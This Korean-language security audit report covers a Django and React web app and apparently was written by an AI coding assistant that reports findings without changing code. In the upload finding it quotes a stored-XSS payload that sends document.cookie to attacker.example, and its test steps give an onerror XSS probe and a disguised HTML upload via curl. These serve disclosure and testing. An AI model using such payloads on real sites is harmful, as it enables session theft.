# SECURITY — 보안 점검 보고서

> 작성일: 2026-09-16
> 범위: `backend/`(Django/DRF 전체), `frontend/src/`, `nginx/`, `docker-compose*.yml`, `backend/config/settings/`
> 상태: **발견·검증만 완료. 코드 수정은 하지 않았다**(사용자 지시 — 2026-09-16).
> 이 문서는 "무엇이 뚫리는가"와 "어떻게 막을 것인가"를 기록한다. 실제 수정은 사용자의 지시가 있을 때 착수한다.

---

## 0. 요약

| 등급 | 건수 | 내용 |
|---|---|---|
| 🔴 치명 | 5 | OIDC 토큰 검증 3건(만료/aud/nonce), 비인증 파일 업로드, 운영 하드코딩 계정 시드 |
| 🟠 높음 | 5 | 비인증 정보 노출 API, DRF 기본 권한 fail-open, SECRET_KEY 기본값, 저장형 XSS, nginx 우회 포트 |
| 🟡 중간 | 9 | 토큰 폐기 부재, 예외 원문 노출, PII 로깅, 보안 헤더, rate limit 등 |

치명 5건 중 **C-1·C-3·C-4 는 실제 실행 출력으로 재현을 확인**했다(§2). 나머지는 코드 근거로 판정했으며,
확인하지 못한 항목은 §6 에 "확인하지 못함"으로 분리해 적었다.

---

## 1. 검증 방법(재현 절차)

`CLAUDE.md` 규칙 C 1-1 의 절차로 Docker 없이 sqlite 로 전체 테스트를 띄워 확인했다.

```bash
SP=/tmp/e2e
mkdir -p $SP/stubs && python3 -m venv $SP/venv
$SP/venv/bin/pip install -q --timeout 120 --retries 5 \
  Django==4.2.13 djangorestframework==3.15.1 django-cors-headers==4.3.1 \
  djangorestframework-simplejwt==5.3.1 Pillow==10.3.0 python-dotenv==1.0.1 \
  django-filter==24.2 django-apscheduler==0.6.2 pandas==2.2.2 sqlalchemy==2.0.30 \
  requests==2.31.0 pymysql==1.1.1 mozilla-django-oidc PyJWT cryptography
# 스텁(datacenterquery.py / test_settings.py)은 CLAUDE.md 규칙 C 1-1 과 동일

cd backend && PYTHONPATH=$SP/stubs DJANGO_SETTINGS_MODULE=test_settings \
  $SP/venv/bin/python manage.py test api          # 기준선: 542 tests, OK (26.7초)
```

- 기존 테스트 **542건 전부 통과**하는 상태에서 점검했다(회귀 기준선).
- 재현 테스트는 프로젝트 밖(`$SP/stubs/verify_security.py`, `$SP/stubs/verify_upload.py`)에 두고 실행했다 — `backend/api/tests.py` 는 건드리지 않았다.
- 재현 테스트는 전부 `@override_settings(AUTH_MODE='sso')`, 즉 **운영과 동일한 인증 모드**에서 돌렸다. 개발 모드(`_is_dev()`)의 비인증 우회를 타고 난 결과가 아니다.
- 대조군으로 `GET /api/documents/` 를 비인증 호출하면 **403** 이 나온다 — DRF 라우트는 정상적으로 막혀 있고, 아래 문제는 그 보호막 **밖에 있는 경로들**이다.

---

## 2. 🔴 치명

### C-1. OIDC id_token 의 만료(exp) 검증이 꺼져 있다

- **위치**: `backend/api/auth_views.py:318-324` (`oidc_callback`)
- **근거(코드)**
  ```python
  decoded_id_token = jwt.decode(
      jwt=b_token, key=public_key, verify=True, algorithms=['RS256'],
      options={
          'verify_signature': True,
          'verify_exp': False,   # 만료 검증은 ADFS가 처리하므로 생략
          'verify_aud': False,
      })
  ```
- **근거(실행 출력)** — 위 옵션을 그대로 복사해 10년 전 만료 토큰을 넣은 결과
  ```
  [OIDC] 10년 전 만료 + 타 서비스용(aud) 토큰이 그대로 통과:
    {'loginid': 'victim_user', 'aud': 'SOME-OTHER-APP', 'iss': 'https://evil.example', 'exp': 1474215466, 'iat': 1474215466}
  ```
- **영향**: 한 번이라도 유출된 id_token(브라우저 히스토리, 프록시/WAF 로그, 공유된 HAR 파일, 단말 캐시)으로 **기한 없이** 그 사용자로 로그인할 수 있다. 서명만 맞으면 통과하므로 ADFS 인증서가 교체되기 전까지 영구 유효하다.
- **코드 주석이 사실과 다르다**: "만료 검증은 ADFS가 처리하므로 생략". ADFS 는 **발급 시점**에만 관여하고, 이미 발급된 토큰의 재사용은 우리 서버가 막아야 한다. 이 주석 때문에 의도된 설계로 오인될 수 있으므로 수정 시 주석도 함께 지운다.
- **권장 조치**
  ```python
  options={'verify_signature': True, 'verify_exp': True, 'verify_aud': True}
  audience=settings.OIDC_RP_CLIENT_ID,
  issuer=settings.OIDC_OP_ISSUER,     # 신규 설정값 필요
  leeway=60,                          # ADFS 와 서버 간 시계 오차 허용
  ```
  시계 오차로 로그인이 실패하는 것이 걱정된다면 `verify_exp` 를 끄는 대신 `leeway` 를 늘린다.

### C-2. aud(대상 서비스) · iss(발급자) 를 검증하지 않는다

- **위치**: `backend/api/auth_views.py:318-324` — `verify_aud: False`, `iss` 비교 코드 없음
- **영향**: 같은 사내 ADFS 가 **다른 시스템용으로 발급한 id_token** 을 이 사이트에 그대로 제출해도 통과한다(토큰 혼동, token confusion). 다른 사내 시스템의 로그를 볼 수 있거나 그 시스템의 클라이언트를 가진 사람이 이 사이트의 임의 계정으로 로그인할 수 있다.
- **권장 조치**: C-1 과 동일 — `audience=OIDC_RP_CLIENT_ID`, `issuer` 고정 검증.

### C-3. nonce(재생 방지) 검증이 사실상 공격자 선택 사항이다

- **위치**: `backend/api/auth_views.py:337`(분기), `:354-356`(실패 무시)
- **근거(코드)**
  ```python
  if nonce_jwt and id_token_nonce:      # ← nonce_jwt 를 안 보내면 이 블록 전체를 건너뛴다
      try:
          ...
          if id_token_nonce != saved_nonce:
              return Response({'error': '잘못된 nonce ...'}, status=400)
      except Exception as e:
          logger.warning(...)
          # nonce_jwt 검증 실패해도 id_token이 유효하면 진행 (호환성)   ← 실패해도 통과
  ```
- **근거(실행 출력)**
  ```
  [OIDC] nonce_jwt 를 생략했을 때 nonce 검증 수행 여부 = False
  ```
- **영향**: `nonce_jwt` 는 **요청자가 폼에 넣어 보내는 값**이라, 빼고 보내면 검증이 없어진다. 넣고 보내도 예외가 나면 통과한다. 결과적으로 로그인 CSRF·토큰 재생 방어가 동작하지 않는다.
  구조적으로도 약하다 — nonce 를 서버 세션이 아니라 **클라이언트(localStorage `oidc_state_jwt`)** 에 맡기고 있어(`frontend/src/api/client.ts:81`, `pages/OIDCCallbackPage.tsx:26`) 브라우저 세션과 묶이지 않는다.
- **권장 조치**
  1. `nonce_jwt` 를 **필수**로 하고, 없거나 검증 실패면 401 로 거부한다(예외를 삼키지 않는다).
  2. nonce 를 **서버 세션(HttpOnly 쿠키 기반)** 에 저장하고 1회 사용 후 폐기한다. `state` 도 같은 방식으로 실제 검증한다(현재 `state` 는 생성만 하고 검증하지 않는다 — `auth_views.py:268`).

### C-4. 파일 업로드가 비인증이고 확장자를 검증하지 않는다

- **위치**: `backend/api/views.py:3734-3774`(`upload_image`), `:3781-3820`(`upload_video`)
- **근거(코드)**: 데코레이터가 `@csrf_exempt` + `@require_POST` 뿐이다. **인증·권한 검사가 한 줄도 없다.**
  검증은 `image.content_type.startswith('image/')` 하나인데, `content_type` 은 **클라이언트가 보내는 값**이라 서버 측 근거가 되지 못한다.
  저장 파일명은 `ext = image.name.split('.')[-1]` — 즉 **업로더가 확장자를 정한다**.
- **근거(실행 출력, `AUTH_MODE='sso'` 조건)**
  ```
  [UPLOAD-IMG] 비인증 POST /api/upload-image/ -> 200
  {"path": "mshot_images/mshot_4176218d8ac54073975622f19e03c866.html",
   "url": "/media/mshot_images/mshot_4176218d8ac54073975622f19e03c866.html",
   "original_name": "payload.html", "size": 70}

  [UPLOAD-VID] 비인증 POST /api/upload-video/ -> 200
  {"path": "guide_videos/guide_3911eaf60ae3446eb22bf879f42d6976.svg", ...}

  [대조군] 비인증 GET /api/documents/ -> 403
  ```
  올린 본문은 `<script>fetch('https://attacker.example/?c='+document.cookie)</script>` 였고, `Content-Type: image/png` 라고 주장했을 뿐이다.
- **영향**
  1. **저장형 XSS** — `/media/` 는 `nginx.conf` 의 `location /media/ { alias /var/www/media/; }` 로 서빙된다. `.html` 은 `text/html` 로, `.svg` 는 `image/svg+xml` 로 내려가며 둘 다 브라우저에서 스크립트가 실행된다. 같은 오리진이므로 세션 탈취·권한 상승으로 이어진다.
  2. **임의 파일 호스팅** — 로그인 없이 누구나 **사내 도메인 이름으로** 피싱 페이지·악성 파일을 올려 URL 을 배포할 수 있다.
  3. **디스크 고갈 DoS** — 인증도 rate limit 도 없이 건당 최대 50MB(`MAX_VIDEO_UPLOAD_SIZE`)를 무제한 반복할 수 있다.
- **권장 조치**
  1. `@api_view(['POST'])` + `@permission_classes([IsAuthenticatedInProd])` 로 인증을 건다(가이드 동영상은 MASTER/PL 제한도 검토).
  2. 확장자 **화이트리스트**(`png/jpg/jpeg/gif/webp`, `mp4/webm`)로 저장 파일명을 서버가 결정한다. 업로더가 보낸 `name`·`content_type` 은 저장 경로 결정에 쓰지 않는다.
  3. 실제 내용 검증 — 이미지는 `PIL.Image.open(f).verify()` 로 파싱에 성공해야만 저장한다(Pillow 는 이미 의존성에 있다).
  4. nginx `/media/` 에 `add_header Content-Disposition "attachment";` 와 `add_header X-Content-Type-Options "nosniff";` 를 붙여, 뚫려도 브라우저에서 실행되지 않게 한다(2차 방어).

### C-5. 운영 배포가 하드코딩 비밀번호 계정을 매번 심는다

- **위치**: `docker-compose.yml:67` → `python manage.py create_users`
  / `backend/api/management/commands/create_users.py:36` `PASSWORD = 'pass1234'`
  / 같은 파일 `:33` `{'loginid': 'master', ..., 'role': 'MASTER'}`
- **근거(코드)**: 운영 compose 의 backend 커맨드가
  `migrate → create_users → seed_lines → collectstatic → gunicorn` 순으로 실행된다.
  `create_users` 는 `get_or_create` 후 **매번 `user.set_password(PASSWORD)` 로 덮어쓴다** — 컨테이너가 재시작될 때마다 비밀번호가 `pass1234` 로 되돌아간다.
- **영향**: 운영 DB에 최고 권한(`MASTER`) 계정 `master` 를 포함한 22개 계정이 공개된 비밀번호로 상주한다. 지금은 운영이 SSO 전용(`AUTH_MODE=sso` → `dev_login_view` 가 403)이라 **이 비밀번호로 웹 로그인이 되는 경로는 확인하지 못했으나**, 비밀번호 로그인 경로가 하나라도 열리거나 Django admin 에 staff 권한이 붙는 순간 최고 권한이 넘어간다. 또한 실제 직원의 loginid 와 충돌하면 그 직원 계정의 권한·부서가 덮어써진다.
- **사용자 결정(2026-09-16)**: **운영 compose 에서만 `create_users` 를 제거**한다. 개발용 `docker-compose.dev.yml` 은 그대로 둔다(결재 케이스 러너가 이 시드 계정을 쓴다 — `scripts/approval_cases/`).
- **권장 조치**
  1. `docker-compose.yml` 의 backend·scheduler 커맨드에서 `python manage.py create_users &&` 를 제거한다.
  2. (권장 추가) `create_users.py` 에 `if settings.AUTH_MODE != 'dev': raise CommandError(...)` 가드를 넣어 운영에서 수동 실행도 막는다.
  3. 이미 운영 DB 에 생긴 시드 계정은 **사용자가 직접 확인 후 삭제/비활성화**해야 한다(`CLAUDE.md` 규칙 J — DB 삭제는 사용자 확인 필수. AI 가 임의로 지우지 않는다).

---

## 3. 🟠 높음

### H-6. 비인증으로 열려 있는 내부 데이터 엔드포인트

- **위치**: `backend/api/views.py` 의 `@require_GET` 전용 함수 뷰들 — `form_options_process`(3624), `form_options_products`(3641), `form_options_process_id`(3662), `form_options_job_file_layer`(3679), `form_options_ovl_layer`(3709), `form_options_bb_external`(3848), `form_options_layer_ids`(3905), `form_options_barcode`(3938), `form_options_mapname`(3972), `form_options_map_info`(3990), `health_check`(3613)
  / `user_events`(4368, SSE) — `@csrf_exempt` 만 있고 인증 없음
- **근거(실행 출력)**
  ```
  [FORM-OPTIONS] GET /api/form-options/processes/        -> 200 {"options": []}
  [FORM-OPTIONS] GET /api/form-options/products/?process=X -> 200 {"options": []}
  [FORM-OPTIONS] GET /api/form-options/process-id/?product=X -> 200 {"options": []}
  [FORM-OPTIONS] GET /api/form-options/map-names/        -> 200 {"options": []}
  [SSE]          GET /api/users/events/                  -> 200 ctype=text/event-stream
  [HEALTH]       GET /api/health/                        -> 200 {"status": "healthy", "db": "connected"}
  ```
  (테스트 DB 가 비어 있어 `options` 가 빈 배열일 뿐, **200 으로 인가를 통과했다는 점**이 핵심이다.)
- **영향**
  - form-options 계열은 공정·제품·PROCESS ID·layer·barcode·MAP 이름 등 **사내 마스터 데이터**를 익명에게 그대로 내준다.
  - `/api/users/events/` 가 더 심각하다. `sse.py` 의 `broadcaster.broadcast('user_added', {...})` 는 **loginid·이름·부서·메일**을 담아 보내며(`auth_views.py:78-85`), 구독자를 가리지 않는다. 즉 **익명 클라이언트가 사내 인원 명부와 권한 변경 내역을 실시간으로 수집**할 수 있다.
  - `/api/health/` 는 예외 발생 시 `str(e)` 를 담은 DB 에러 원문을 반환한다(`views.py:3620`).
- **사용자 결정(2026-09-16)**: **전부 인증 필수로 전환**한다.
- **권장 조치**: 각 함수 뷰를 `@api_view(['GET'])` + `@permission_classes([IsAuthenticatedInProd])` 로 바꾼다. 개발 모드(`_is_dev()`)는 기존대로 통과하므로 개발 흐름은 그대로다. `/api/health/` 는 컨테이너 헬스체크용이라 비인증을 유지하되 **에러 원문은 응답에서 제거**한다(M-13 과 함께).

### H-7. DRF 전역 기본 권한이 fail-open 이다

- **위치**: `backend/config/settings/base.py` — `'DEFAULT_PERMISSION_CLASSES': ['rest_framework.permissions.IsAuthenticatedOrReadOnly']`
- **근거(실행 출력)**: `[SETTINGS] DEFAULT_PERMISSION_CLASSES = ['rest_framework.permissions.IsAuthenticatedOrReadOnly']`
- **영향**: 현재 모든 ViewSet 이 `permission_classes` 를 명시하고 있어 당장 새는 곳은 없다(전수 확인함). 그러나 **앞으로 추가될 ViewSet 에서 한 줄만 빠뜨리면 그 순간 전체 읽기 공개**가 된다. 기본값은 "막힌 쪽"이어야 한다.
- **권장 조치**: `IsAuthenticated` 로 바꾸고, 비인증 접근이 필요한 소수(`health_check`, 외부 API Key 라우트)만 명시적으로 연다.

### H-8. `SECRET_KEY` 에 안전하지 않은 기본값이 있다

- **위치**: `backend/config/settings/base.py`
  `SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY', 'django-insecure-change-me-in-production')`
- **근거(실행 출력)**
  ```
  [SETTINGS] DJANGO_SECRET_KEY env 설정됨? False
  [SETTINGS] 실제 사용 중인 SECRET_KEY = 'django-insecure-change-me-in-production'
  ```
- **영향**: `.env` 에 값이 빠져도 **경고 없이 공개된 문자열로 기동**한다. 이 키는 Django 세션 서명과 OIDC nonce JWT 서명(`auth_views.py:255`)에 쓰이므로, 값이 알려지면 세션 위조와 nonce 위조가 가능하다.
- **권장 조치**: `production.py` 에서 fail-closed 로 만든다.
  ```python
  if not os.environ.get('DJANGO_SECRET_KEY'):
      raise ImproperlyConfigured('운영 환경에서는 DJANGO_SECRET_KEY 가 반드시 필요합니다.')
  ```
  같은 방식으로 `SERVICE_JWT_SECRET_KEY` 도 운영에서 필수화한다(현재는 비어 있으면 요청 시점에 401 로 실패 — fail-closed 이긴 하나 기동 시점에 잡는 편이 낫다).

### H-9. 저장형 XSS — 사용자 HTML 을 정제 없이 렌더링한다

- **위치**(총 6곳)
  | 파일:라인 | 렌더링 대상 |
  |---|---|
  | `frontend/src/pages/VOCPage.tsx:489` | VOC 본문 |
  | `frontend/src/pages/VOCPage.tsx:519` | VOC 댓글 |
  | `frontend/src/pages/GuidePage.tsx:268, 328` | 가이드 본문 |
  | `frontend/src/pages/HomePage.tsx:279` | 공지 본문 |
  | `frontend/src/components/GuideSlidePanel.tsx:136` | 가이드 본문 |
  | `frontend/src/components/PagedDetailView.tsx:2076` | 의뢰서 `map_change_reason` |
  | (참고) `frontend/src/utils/detailExport.ts:71` | `div.innerHTML = html` |
- **근거**: 프로젝트 전체에 HTML 정제 코드가 **없다**. `grep -rn "DOMPurify\|sanitize"` 결과는 `sanitizeSignedDecimal`(숫자 입력 필터) 뿐이고, `frontend/package.json` 에 `dompurify` 의존성이 없다. 백엔드에도 `bleach` 류 정제가 없다.
- **영향**: 입력 UI(`RichTextEditor.tsx`)가 안전한 태그만 만들더라도, **API 를 직접 호출하면 임의 HTML 을 저장할 수 있다**(VOC 생성·가이드 작성·의뢰서 수정 모두 일반 인증 사용자 권한). 저장된 스크립트는 그 문서를 여는 모든 사람(특히 결재 화면을 보는 MASTER·TE_* 담당자)의 브라우저에서 실행된다. 인증이 필요하므로 C-4 보다 한 단계 아래지만, **내부자 또는 C-4 로 탈취한 세션과 결합하면 권한 상승 경로**가 된다.
- **권장 조치**
  1. `dompurify` 를 추가하고, 위 6곳을 공용 래퍼(예: `frontend/src/components/SafeHtml.tsx`)로 통일한다.
     허용 태그는 에디터가 실제로 만드는 것만(`p, br, strong, em, u, s, ul, ol, li, a, span` 등), `a` 는 `href` 스킴을 http/https 로 제한한다.
  2. 백엔드에서도 저장 시 정제한다(방어 심층화). 프론트만 고치면 다른 소비자(메일 본문 등)가 남는다 — `mailer.py` 가 같은 필드를 메일 HTML 에 넣는지 확인 필요(§6).

### H-10. 운영 compose 가 nginx 를 우회하는 포트를 호스트에 노출한다

- **위치**: `docker-compose.yml:11-12`(db `3306:3306`), `:37-38`(backend `8000:8000`)
  / `backend/config/settings/production.py` `SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')`
- **영향**
  1. MySQL 이 호스트 포트로 열려 있다. 호스트에 닿을 수 있는 누구나 DB 자격증명만 알면 직접 붙을 수 있다(C-5 의 시드 계정과 결합하면 더 나쁘다).
  2. `:8000` 으로 **nginx·TLS 를 건너뛰고** Django 에 직접 요청할 수 있다. `SECURE_SSL_REDIRECT=True` 가 있지만 `X-Forwarded-Proto: https` 헤더를 요청자가 직접 붙이면 리다이렉트를 우회한다 — 프록시 헤더를 **무조건 신뢰**하기 때문이다. 이 경로로는 평문 HTTP 로 API 전체를 호출할 수 있다.
- **권장 조치**
  1. `ports:` 를 지우고 컨테이너 네트워크 내부 통신(`expose`)만 남긴다. 디버깅이 필요하면 `127.0.0.1:8000:8000` 처럼 루프백에 바인딩한다.
  2. nginx 가 클라이언트가 보낸 `X-Forwarded-Proto` 를 덮어쓰도록 확실히 한다(현재 `proxy_set_header X-Forwarded-Proto https;` 로 고정돼 있어 nginx 경유는 안전 — 문제는 nginx 를 건너뛰는 경로다).

---

## 4. 🟡 중간

| # | 내용 | 위치 | 권장 조치 |
|---|---|---|---|
| M-11 | 서비스 JWT 에 **회전·폐기 없음**. `SIMPLE_JWT` 의 `ROTATE_REFRESH_TOKENS`/`BLACKLIST_AFTER_ROTATION` 은 simplejwt 토큰용이라, 직접 만든 이 토큰 경로에는 적용되지 않는다 | `auth_views.py:150-200`, `base.py` SIMPLE_JWT | refresh 사용 시 jti 기록 + 1회용화, 또는 서버측 토큰 저장소 도입 |
| M-12 | **로그아웃이 토큰을 무효화하지 않는다** — 쿠키만 지운다. 탈취된 토큰은 access 12시간 / refresh 7일간 계속 유효 | `auth_views.py:530-568` | jti 블랙리스트. 최소한 access 수명을 12시간→1시간으로 단축하고 refresh 로 갱신 |
| M-13 | **예외 원문(`str(e)`)을 응답에 노출** — 내부 경로·드라이버·쿼리 정보가 샌다 | `views.py` upload/form-options/health, `authentication.py:71,78` | 응답은 일반 메시지, 상세는 로그로만 |
| M-14 | **PII 로깅** — OIDC 클레임 전체(메일·부서·사번·이름)를 INFO 로 남긴다 | `auth_views.py:410-425` | DEBUG 레벨로 낮추거나 loginid 만 남긴다 |
| M-15 | **보안 헤더 부재** — CSP / X-Content-Type-Options / Referrer-Policy / Permissions-Policy 없음. `/media/` 에 `Content-Disposition` 없음 | `nginx/nginx.conf` | `add_header` 로 일괄 추가. H-9·C-4 의 2차 방어가 된다 |
| M-16 | `'=' in username` 이면 **무조건 base64 디코딩을 시도**한다. 디코딩이 우연히 성공하면 계정 식별자가 바뀐다 | `auth_views.py:449-456` | 제거하거나, ADFS 가 실제로 base64 sub 를 주는 경우에만 `sub` 클레임에 한정해 적용 |
| M-17 | **rate limit 전무** — DRF throttling 미설정. 로그인·업로드·조회 모두 무제한 | `base.py` REST_FRAMEWORK | `DEFAULT_THROTTLE_CLASSES`(anon/user) 설정 |
| M-18 | `DATA_UPLOAD_MAX_MEMORY_SIZE = 55MB` 가 **비인증 업로드(C-4)** 와 결합해 디스크 고갈 DoS 가 된다 | `base.py` + `views.py:3734` | C-4 수정으로 대부분 해소. 추가로 업로드 전용 throttle |
| M-19 | 디버그 `print()` 잔존 (`CLAUDE.md` 규칙 I 위반) | `views.py:3487` | logger 로 교체하거나 삭제 |

---

## 5. 안전하다고 확인한 영역

점검 과정에서 **문제가 없음을 확인한** 부분도 기록해 둔다(다음 점검 때 중복 조사 방지).

- **SQL 인젝션**: 없다. `scheduler.py:212,299,528` 의 f-string SQL 은 테이블·컬럼명이 전부 **코드 내부 상수**이고, 값은 `:line` 바인드 파라미터로 넘긴다. ORM 사용처도 문자열 조립이 없다.
- **결재 액션 인가**: 서버측에서 제대로 강제된다. `views.py` 의 `_can_act_on_step` / `_can_assign_step` / `_can_claim_step` / `_can_unclaim_step` / `_can_confirm_pause` 가 프론트 UI 가드와 별개로 역할·담당자를 검사한다(`APPROVAL.md §6-1` 의 우회 문제가 해결된 상태).
- **문서 권한**: `doc_permissions.py` 의 `can_edit`/`can_delete`/`can_withdraw`/`can_request_pause` 가 상태별로 분리돼 있고, `RequestDocumentViewSet.update`(3262)와 `get_queryset`(3186)이 이를 실제로 호출한다. 임시저장(draft)은 작성자·지정 공유그룹·MASTER 로 제한된다.
- **REST DELETE 차단**: `RequestDocumentViewSet.http_method_names` 에서 `delete` 를 뺐고, 그 이유(액션 메서드명 충돌)까지 주석에 남아 있다. 적절하다.
- **외부 API Key**: `hmac.compare_digest` 상수시간 비교, 키 미설정 시 fail-closed, `authenticate_header` 로 401 반환까지 정확하다(`authentication.py:88-111`).
- **권한 상승(assign_role)**: `views.py:4274-4298` — 비MASTER 는 대상이 `NONE` 일 때 자신의 역할로만 부여 가능. 자기 자신을 MASTER 로 올리는 경로는 없다.
- **UserSerializer 대량 할당**: `role` 이 쓰기 가능하지만 `UserViewSet.permission_classes = [IsMasterOrReadOnly]` 라 MASTER 만 PATCH 할 수 있다.
- **CSRF(쿠키 JWT)**: 토큰 쿠키가 `samesite='Lax'` 라 교차 사이트 POST 에는 쿠키가 실리지 않는다. DRF 커스텀 인증에 CSRF 미들웨어가 적용되지 않는 점은 이 설정으로 상당 부분 상쇄된다. 다만 C-4 의 업로드 엔드포인트는 애초에 인증이 없어 이 방어와 무관하다.
- **개발 로그인(`dev_login_view`)**: `AUTH_MODE != 'dev'` 면 403. 운영 기본값은 `sso` 다.
- **media 정적 서빙**: `config/urls.py` 의 `static(settings.MEDIA_URL, ...)` 는 `DEBUG=False` 면 빈 리스트를 반환하므로 운영에서 Django 가 직접 서빙하지 않는다(nginx 담당).

---

## 6. 확인하지 못한 것 (추측으로 적지 않는다)

`CLAUDE.md` 규칙 C 1-3 에 따라, 실행으로 확인하지 못한 항목을 그대로 적는다.

1. **운영 DB 의 실제 상태** — 시드 계정(`master` 등 22건)이 현재 운영 DB 에 남아 있는지, 실제 직원 loginid 와 충돌한 적이 있는지 확인하지 못했다. 운영 DB 접근 권한이 없다.
2. **운영 `.env` 의 실제 값** — `DJANGO_SECRET_KEY`·`SERVICE_JWT_SECRET_KEY` 가 운영에서 실제로 채워져 있는지 확인하지 못했다(규칙 D — `.env` 는 읽기만 하며, 이 세션에는 운영 `.env` 가 없다). 채워져 있다면 H-8 의 즉시 위험은 없고 "기본값이 존재한다"는 구조적 문제만 남는다.
3. **ADFS 가 실제로 반환하는 클레임** — `aud`/`iss` 값의 실제 형태를 확인하지 못했다. C-1/C-2 수정 시 운영 ADFS 의 실제 토큰으로 값을 맞춰야 한다.
4. **메일 본문의 HTML 경로** — `mailer.py`(1972줄)에서 `map_change_reason` 같은 사용자 HTML 을 메일 본문에 넣는지 전수 확인하지 못했다. H-9 수정 시 함께 점검해야 한다.
5. **결재 케이스 러너(`scripts/approval_cases/run_cases`)** — 개발환경(`AUTH_MODE=dev`)이 떠 있어야 하는데 이 세션에는 없어 실행하지 못했다. 이번 점검은 결재 로직을 **수정하지 않았으므로** 러너 대상이 아니다. 다만 §3 H-6(비인증 엔드포인트 인증 부착) 등을 실제로 수정할 때는 러너를 돌려야 한다.
6. **운영 nginx 앞단의 방화벽/WAF** — H-10 의 `:8000`·`:3306` 이 사내망 밖에서도 실제로 닿는지 확인하지 못했다. 방화벽으로 막혀 있다면 위험도가 낮아진다.

---

## 7. 수정 시 검증 시나리오 (수동)

실제로 고칠 때 이 순서로 확인한다. 자동 테스트만으로는 부족한 부분이다.

### 7-1. OIDC 로그인 (C-1 ~ C-3 수정 후) — **회귀 위험이 가장 큰 구간**
1. 시크릿 창에서 `https://<운영주소>:10010/` 접속 → ADFS 로그인 화면으로 이동하는지
2. 사번/비밀번호 입력 → **정상 로그인되어 홈 화면(결재 현황)이 뜨는지**
3. 성공 판정: 우상단에 본인 이름·부서가 표시되고, `결재 현황` 목록이 로딩된다
4. 실패 신호: 로그인 후 다시 ADFS 로 튕긴다(= exp/aud/iss 검증이 실제 클레임과 안 맞음) / "잘못된 nonce" 400 이 뜬다(= nonce 를 세션에 못 싣고 있음)
5. 시계 오차 의심 시: 백엔드 로그에서 `[OIDC] Invalid ID token: Signature has expired` 를 확인하고 `leeway` 를 조정

### 7-2. 파일 업로드 (C-4 수정 후)
1. **비로그인 상태**에서 터미널로 직접 호출:
   `curl -k -X POST https://<주소>:10010/api/upload-image/ -F "image=@x.html;type=image/png"`
   → 성공 판정: **401 또는 403**. 지금은 200 + 저장 경로가 돌아온다.
2. 로그인 후 `의뢰서 작성` → MAP 단계 → mshot 이미지 첨부 → **정상 업로드·미리보기**
3. 로그인 후 확장자만 바꾼 파일(`x.html` 을 `image/png` 로) 업로드 → 성공 판정: 400 "이미지 파일만 업로드할 수 있습니다"
4. `가이드` 메뉴(MASTER 로그인) → 동영상 첨부 → 정상 재생

### 7-3. 비인증 엔드포인트 (H-6 수정 후)
1. **비로그인**으로 `https://<주소>:10010/api/form-options/processes/` 직접 접속 → 성공 판정: 401/403
2. **비로그인**으로 `/api/users/events/` 접속 → 성공 판정: 401/403 (지금은 `text/event-stream` 으로 연결이 유지된다)
3. 로그인 후 `의뢰서 작성` 화면 진입 → **공정·제품·PROCESS ID 드롭다운에 값이 채워지는지** (여기가 깨지면 H-6 수정이 의뢰서 작성을 막은 것)
4. MASTER 로그인 → `권한 관리` 화면을 열어둔 채 다른 창에서 사용자 역할 변경 → **목록이 새로고침 없이 갱신되는지**(SSE 정상 동작 확인)

### 7-4. XSS (H-9 수정 후)
1. 로그인 후 `VOC` → 새 글 작성 → 본문에 굵게/밑줄/줄바꿈 사용 → 저장 → 상세 열기 → **서식이 그대로 보이는지**(정제가 과해서 서식이 날아가면 안 된다)
2. API 로 직접 `<img src=x onerror=alert(1)>` 를 넣어 VOC 를 생성 → 상세 화면에서 **알림창이 뜨지 않고 텍스트도 렌더되지 않는지**
3. `가이드`·`공지`·의뢰서 `MAP 변경 사유` 각각 동일 확인

### 7-5. 회귀 확인 (공통)
- `manage.py test api` → **542건 전부 통과**(기준선과 동일해야 한다)
- `cd frontend && npm test -- --watchAll=false --passWithNoTests`
- `cd frontend && npx tsc --noEmit 2>&1 | grep -c "error TS"` → 0
- 결재 로직을 건드렸다면 `python3 -m scripts.approval_cases.run_cases`(개발환경)

---

## 8. 사용자 결정 기록

| 항목 | 결정 | 일자 |
|---|---|---|
| 이번 작업 범위 | **보고서만 작성, 코드는 수정하지 않는다** | 2026-09-16 |
| C-5 시드 계정 | 운영 compose 에서만 `create_users` 제거. 개발(`docker-compose.dev.yml`)은 유지 | 2026-09-16 |
| H-6 비인증 API | form-options · SSE 등 **전부 인증 필수로 전환** | 2026-09-16 |

> 아래 두 결정은 방향만 확정된 상태이며 **아직 코드에 반영되지 않았다.** 착수 지시가 있을 때 이 문서의 권장 조치대로 진행한다.
